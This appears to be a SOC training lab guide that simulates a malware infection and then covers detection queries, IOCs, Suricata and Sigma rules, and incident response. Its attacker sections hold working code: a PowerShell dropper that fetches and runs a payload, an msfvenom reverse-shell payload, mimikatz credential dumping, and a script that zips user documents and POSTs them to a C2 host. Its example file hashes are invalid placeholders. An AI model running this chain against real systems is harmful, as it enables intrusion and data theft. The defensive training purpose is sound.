# Attack Scenario 2: Malware Analysis and Detection

## Scenario Overview
This scenario simulates a malware infection chain starting from email delivery through execution, persistence, and data exfiltration. SOC analysts will practice malware detection, analysis, and incident response procedures.

## Learning Objectives
- Detect malware execution in endpoint logs
- Analyze malware behavior and artifacts
- Perform static and dynamic malware analysis
- Create IOCs and detection signatures
- Implement containment procedures

## Attack Timeline
**Duration**: 3-4 hours  
**Difficulty**: Intermediate  
**Prerequisites**: Basic understanding of Windows processes, file systems, and network protocols

## Lab Setup

### Target Systems
- **Windows 10 Vulnerable VM** (10.0.2.102) - Primary infection target
- **Ubuntu Vulnerable VM** (10.0.2.101) - Secondary target for lateral movement

### Monitoring Systems
- **ELK SIEM** (10.0.2.100) - Log collection and analysis
- **Network monitoring** - Traffic analysis with Suricata

### Malware Samples
- **Custom PowerShell dropper** - Initial payload
- **Mimikatz** - Credential harvesting
- **Custom backdoor** - Persistence and C2
- **Data exfiltration script** - Simulated data theft

## Attack Execution

### Phase 1: Initial Infection (30 minutes)

#### Attacker Actions (Kali Linux)
```bash
# Create malicious PowerShell script
cat > /tmp/dropper.ps1 << 'EOF'
# PowerShell Dropper Script
$url = "http://10.0.2.15:8080/payload.exe"
$output = "$env:TEMP\svchost.exe"

# Download payload
try {
    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
    Write-Host "Download successful"
} catch {
    Write-Host "Download failed"
    exit
}

# Execute payload
if (Test-Path $output) {
    Start-Process -FilePath $output -WindowStyle Hidden
    Write-Host "Payload executed"
}

# Create persistence
$taskName = "SystemUpdate"
$action = New-ScheduledTaskAction -Execute $output
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force

# Clean up
Remove-Item $PSCommandPath -Force
EOF

# Create simple backdoor executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f exe > /tmp/payload.exe

# Start web server to host malware
cd /tmp
python3 -m http.server 8080 &

# Start Metasploit handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.0.2.15; set LPORT 4444; exploit"
```

#### Infection Vector Simulation
```powershell
# On Windows target (simulate user clicking malicious email attachment)
# Copy dropper.ps1 to target system
# Execute with:
powershell.exe -ExecutionPolicy Bypass -File C:\Users\vulnerable\Downloads\dropper.ps1
```

#### Expected Logs Generated
```powershell
# Sysmon Event ID 1 - Process Creation
Event ID: 1
Process: powershell.exe
CommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\Users\vulnerable\Downloads\dropper.ps1
ParentProcess: explorer.exe

# Sysmon Event ID 3 - Network Connection
Event ID: 3
Process: powershell.exe
Protocol: TCP
SourceIp: 10.0.2.102
DestinationIp: 10.0.2.15
DestinationPort: 8080

# Sysmon Event ID 11 - File Creation
Event ID: 11
Process: powershell.exe
TargetFilename: C:\Users\vulnerable\AppData\Local\Temp\svchost.exe
```

### Phase 2: Persistence and Privilege Escalation (45 minutes)

#### Attacker Actions (Meterpreter Session)
```bash
# Meterpreter commands
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps

# Upload additional tools
meterpreter > upload /opt/mimikatz.exe C:\\Windows\\Temp\\
meterpreter > upload /opt/PowerUp.ps1 C:\\Windows\\Temp\\

# Execute privilege escalation
meterpreter > execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\\Windows\\Temp\\PowerUp.ps1" -i

# Create additional persistence
meterpreter > run persistence -S -U -X -i 60 -p 4445 -r 10.0.2.15

# Dump credentials
meterpreter > execute -f C:\\Windows\\Temp\\mimikatz.exe -a "sekurlsa::logonpasswords exit" -i
```

#### Expected Logs Generated
```powershell
# Sysmon Event ID 7 - Image/DLL Load
Event ID: 7
Process: svchost.exe
ImageLoaded: C:\Windows\System32\ntdll.dll

# Sysmon Event ID 8 - CreateRemoteThread
Event ID: 8
SourceProcess: svchost.exe
TargetProcess: lsass.exe

# Sysmon Event ID 10 - Process Access
Event ID: 10
SourceProcess: mimikatz.exe
TargetProcess: lsass.exe
GrantedAccess: 0x1010
```

### Phase 3: Lateral Movement (30 minutes)

#### Attacker Actions
```bash
# Enumerate network
meterpreter > run post/windows/gather/enum_domain
meterpreter > run post/windows/gather/enum_computers

# Attempt lateral movement to Linux system
meterpreter > portfwd add -l 2222 -p 22 -r 10.0.2.101
meterpreter > execute -f plink.exe -a "-ssh vulnerable@127.0.0.1 -P 2222 -pw password"

# Alternative: Use stolen credentials
# psexec.py domain/user:password@10.0.2.101
```

#### Expected Logs Generated
```bash
# Linux SSH logs
Dec 06 11:30:15 ubuntu sshd[5678]: Accepted password for vulnerable from 10.0.2.102 port 45123 ssh2
Dec 06 11:30:16 ubuntu sshd[5679]: pam_unix(sshd:session): session opened for user vulnerable

# Windows network logs
Event ID: 5156 - Windows Filtering Platform allowed a connection
Application: plink.exe
Direction: Outbound
Protocol: TCP
RemoteAddress: 10.0.2.101
RemotePort: 22
```

### Phase 4: Data Exfiltration (30 minutes)

#### Attacker Actions
```bash
# Search for sensitive files
meterpreter > search -f *.docx -d C:\\Users\\
meterpreter > search -f *.xlsx -d C:\\Users\\
meterpreter > search -f *.pdf -d C:\\Users\\

# Create data collection script
cat > /tmp/collect_data.ps1 << 'EOF'
$outputPath = "$env:TEMP\collected_data.zip"
$sourcePaths = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop"
)

# Compress files
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zip = [System.IO.Compression.ZipFile]::Open($outputPath, 'Create')

foreach ($path in $sourcePaths) {
    if (Test-Path $path) {
        Get-ChildItem $path -Recurse -File | ForEach-Object {
            $relativePath = $_.FullName.Substring($path.Length + 1)
            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $_.FullName, $relativePath)
        }
    }
}
$zip.Dispose()

# Exfiltrate via HTTP POST
$uri = "http://10.0.2.15:8080/upload"
$fileBytes = [System.IO.File]::ReadAllBytes($outputPath)
$base64 = [System.Convert]::ToBase64String($fileBytes)
Invoke-RestMethod -Uri $uri -Method POST -Body $base64

# Clean up
Remove-Item $outputPath -Force
EOF

# Upload and execute data collection
meterpreter > upload /tmp/collect_data.ps1 C:\\Windows\\Temp\\
meterpreter > execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\\Windows\\Temp\\collect_data.ps1" -i
```

#### Expected Logs Generated
```powershell
# Sysmon Event ID 11 - File Creation (ZIP file)
Event ID: 11
Process: powershell.exe
TargetFilename: C:\Users\vulnerable\AppData\Local\Temp\collected_data.zip

# Sysmon Event ID 3 - Network Connection (Data exfiltration)
Event ID: 3
Process: powershell.exe
Protocol: TCP
DestinationIp: 10.0.2.15
DestinationPort: 8080
```

## SOC Analysis Tasks

### Task 1: Initial Detection (45 minutes)

#### Suspicious Process Analysis
```bash
# Kibana query for suspicious PowerShell execution
winlog.event_id:1 AND process.name:"powershell.exe" AND process.command_line:*ExecutionPolicy*

# Look for unusual process relationships
winlog.event_id:1 AND process.parent.name:"explorer.exe" AND process.name:"powershell.exe"

# Network connections from PowerShell
winlog.event_id:3 AND process.name:"powershell.exe"
```

#### File System Activity Analysis
```bash
# Suspicious file creation in temp directories
winlog.event_id:11 AND file.path:*\\Temp\\* AND file.name:*.exe

# Scheduled task creation
winlog.event_id:4698 AND winlog.event_data.TaskName:*

# Registry modifications for persistence
winlog.event_id:13 AND winlog.event_data.TargetObject:*\\Run\\*
```

### Task 2: Malware Analysis (60 minutes)

#### Static Analysis
```bash
# File hash calculation
Get-FileHash C:\Users\vulnerable\AppData\Local\Temp\svchost.exe -Algorithm SHA256

# String analysis
strings svchost.exe | grep -E "(http|ftp|tcp|cmd|powershell)"

# PE analysis
file svchost.exe
objdump -p svchost.exe
```

#### Dynamic Analysis Preparation
```powershell
# Enable additional logging
auditpol /set /category:"Detailed Tracking" /success:enable /failure:enable
auditpol /set /category:"Object Access" /success:enable /failure:enable

# Process monitoring
Get-Process | Where-Object {$_.ProcessName -eq "svchost"} | Select-Object Id,ProcessName,Path,StartTime
```

#### Behavioral Analysis
```bash
# Process tree analysis
winlog.event_id:1 AND process.parent.pid:1234

# Network behavior
winlog.event_id:3 AND process.pid:1234

# File system behavior
winlog.event_id:11 AND process.pid:1234
```

### Task 3: Credential Compromise Detection (45 minutes)

#### LSASS Access Detection
```bash
# Detect LSASS process access
winlog.event_id:10 AND winlog.event_data.TargetImage:*\\lsass.exe

# Mimikatz execution indicators
winlog.event_id:1 AND process.command_line:*sekurlsa*
```

#### Privilege Escalation Detection
```bash
# Token manipulation
winlog.event_id:4672 AND winlog.event_data.PrivilegeList:*SeDebugPrivilege*

# Service creation for persistence
winlog.event_id:4697 AND winlog.event_data.ServiceName:*
```

### Task 4: Lateral Movement Analysis (30 minutes)

#### Network Analysis
```bash
# Unusual outbound connections
winlog.event_id:3 AND destination.port:(22 OR 3389 OR 445) AND NOT source.ip:10.0.2.102

# Port forwarding detection
winlog.event_id:3 AND process.name:*plink* OR process.name:*ssh*
```

#### Authentication Analysis
```bash
# Linux: Successful SSH from Windows system
program:"sshd" AND "Accepted password" AND src_ip:"10.0.2.102"

# Windows: Network logon from compromised system
winlog.event_id:4624 AND winlog.event_data.LogonType:3 AND winlog.event_data.IpAddress:"10.0.2.102"
```

### Task 5: Data Exfiltration Detection (30 minutes)

#### Large File Operations
```bash
# File compression activities
winlog.event_id:1 AND process.command_line:*zip* OR process.command_line:*compress*

# Large file creation
winlog.event_id:11 AND file.size:>10000000
```

#### Network Exfiltration
```bash
# Large outbound data transfers
bytes:>1000000 AND source.ip:"10.0.2.102" AND destination.ip:"10.0.2.15"

# HTTP POST requests with large payloads
http.request.method:"POST" AND http.request.body.bytes:>1000000
```

## IOC Development

### File-based IOCs
```yaml
# File hashes
MD5: a1b2c3d4e5f6789012345678901234567
SHA1: 1234567890abcdef1234567890abcdef12345678
SHA256: abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890

# File paths
- C:\Users\*\AppData\Local\Temp\svchost.exe
- C:\Windows\Temp\mimikatz.exe
- C:\Windows\Temp\PowerUp.ps1

# File names
- svchost.exe (in temp directories)
- collected_data.zip
- dropper.ps1
```

### Network IOCs
```yaml
# IP addresses
- 10.0.2.15 (C2 server)

# URLs
- http://10.0.2.15:8080/payload.exe
- http://10.0.2.15:8080/upload

# User agents
- PowerShell/5.1
- Custom backdoor agent
```

### Registry IOCs
```yaml
# Persistence keys
- HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemUpdate
- HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemUpdate

# Scheduled tasks
- \Microsoft\Windows\SystemUpdate
```

### Process IOCs
```yaml
# Command lines
- powershell.exe -ExecutionPolicy Bypass
- mimikatz.exe sekurlsa::logonpasswords
- svchost.exe (running from temp directory)

# Process relationships
- explorer.exe -> powershell.exe -> svchost.exe
```

## Detection Rules

### Suricata Rules
```bash
# Malware download detection
alert http any any -> $HOME_NET any (msg:"Malware Download Detected"; flow:to_client,established; content:"payload.exe"; http_uri; sid:1000020; rev:1;)

# C2 communication
alert tcp $HOME_NET any -> any 4444 (msg:"Meterpreter C2 Communication"; flow:to_server,established; content:"|00 00 00|"; depth:3; sid:1000021; rev:1;)

# Data exfiltration
alert http $HOME_NET any -> any any (msg:"Large HTTP POST - Possible Data Exfiltration"; flow:to_server,established; http_method; content:"POST"; dsize:>100000; sid:1000022; rev:1;)
```

### Sigma Rules
```yaml
title: Suspicious PowerShell Execution
description: Detects PowerShell execution with bypass execution policy
references:
    - https://attack.mitre.org/techniques/T1059/001/
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1
        Image|endswith: '\powershell.exe'
        CommandLine|contains: 'ExecutionPolicy Bypass'
    condition: selection
falsepositives:
    - Legitimate administrative scripts
level: medium
tags:
    - attack.execution
    - attack.t1059.001
```

### ELK Detection Rules
```json
{
  "query": {
    "bool": {
      "must": [
        {
          "match": {
            "winlog.event_id": "1"
          }
        },
        {
          "wildcard": {
            "process.command_line": "*ExecutionPolicy*Bypass*"
          }
        }
      ]
    }
  }
}
```

## Response Procedures

### Immediate Containment (20 minutes)

1. **Isolate Infected Systems**
   ```bash
   # Network isolation
   # Disable network adapter or implement firewall rules
   netsh interface set interface "Ethernet" admin=disable
   ```

2. **Kill Malicious Processes**
   ```powershell
   # Identify and terminate malicious processes
   Get-Process | Where-Object {$_.Path -like "*\Temp\*"} | Stop-Process -Force
   
   # Remove scheduled tasks
   Unregister-ScheduledTask -TaskName "SystemUpdate" -Confirm:$false
   ```

3. **Block C2 Communication**
   ```bash
   # Add firewall rules to block C2 server
   netsh advfirewall firewall add rule name="Block C2" dir=out action=block remoteip=10.0.2.15
   ```

### Investigation Phase (60 minutes)

1. **Memory Dump Collection**
   ```powershell
   # Create memory dump for analysis
   # Use tools like WinPmem or DumpIt
   .\winpmem.exe -o memory_dump.raw
   ```

2. **Disk Forensics**
   ```bash
   # Create disk image
   # Use tools like FTK Imager or dd
   dd if=/dev/sda of=/tmp/disk_image.dd bs=4096
   ```

3. **Timeline Analysis**
   ```bash
   # Create timeline of events
   # Combine Sysmon, Security, and Application logs
   # Use tools like Plaso or Log2timeline
   ```

### Eradication Phase (45 minutes)

1. **Remove Malware Files**
   ```powershell
   # Delete malicious files
   Remove-Item "C:\Users\*\AppData\Local\Temp\svchost.exe" -Force
   Remove-Item "C:\Windows\Temp\mimikatz.exe" -Force
   Remove-Item "C:\Windows\Temp\PowerUp.ps1" -Force
   ```

2. **Clean Registry**
   ```powershell
   # Remove persistence entries
   Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdate"
   ```

3. **Reset Compromised Credentials**
   ```powershell
   # Force password reset for all users
   net user vulnerable NewPassword123!
   net user admin NewPassword123!
   ```

### Recovery Phase (30 minutes)

1. **System Hardening**
   ```powershell
   # Enable PowerShell logging
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
   
   # Configure Windows Defender
   Set-MpPreference -EnableRealtimeMonitoring $true
   Set-MpPreference -EnableBehaviorMonitoring $true
   ```

2. **Monitoring Enhancement**
   ```bash
   # Deploy additional Sysmon configuration
   # Implement custom detection rules
   # Increase log retention
   ```

## Expected Findings

### Attack Characteristics
- **Initial vector**: Malicious PowerShell script
- **Persistence**: Scheduled task creation
- **Privilege escalation**: Token manipulation
- **Credential theft**: Mimikatz usage
- **Lateral movement**: SSH to Linux system
- **Data exfiltration**: HTTP POST to C2 server

### Detection Timeline
- **T+0**: Initial PowerShell execution
- **T+5**: Malware download and execution
- **T+10**: Persistence establishment
- **T+15**: Credential harvesting
- **T+30**: Lateral movement attempt
- **T+45**: Data collection and exfiltration

## Lab Variations

### Advanced Scenarios
1. **Fileless Malware**: PowerShell-only attack without file drops
2. **Living off the Land**: Use of legitimate Windows tools
3. **Encrypted C2**: HTTPS communication with valid certificates
4. **Anti-Analysis**: Malware with evasion techniques

### Evasion Techniques
1. **Process Hollowing**: Inject code into legitimate processes
2. **DLL Side-loading**: Abuse legitimate applications
3. **WMI Persistence**: Use WMI for persistence instead of scheduled tasks
4. **DNS Tunneling**: Exfiltrate data via DNS queries

## Assessment Criteria

### Beginner Level (Pass)
- [ ] Detect initial malware execution
- [ ] Identify persistence mechanisms
- [ ] Recognize credential theft attempts
- [ ] Implement basic containment

### Intermediate Level (Good)
- [ ] Perform malware analysis
- [ ] Create IOCs and detection rules
- [ ] Analyze lateral movement
- [ ] Generate comprehensive timeline

### Advanced Level (Excellent)
- [ ] Conduct memory forensics
- [ ] Develop custom detection logic
- [ ] Implement automated response
- [ ] Create threat intelligence reports

## Additional Resources

### Malware Analysis Tools
- **Static Analysis**: PEiD, Strings, Hex editors
- **Dynamic Analysis**: Process Monitor, API Monitor
- **Memory Analysis**: Volatility, Rekall
- **Network Analysis**: Wireshark, NetworkMiner

### Reference Materials
- MITRE ATT&CK Framework
- SANS FOR508 course materials
- Malware analysis blogs and whitepapers
- Incident response playbooks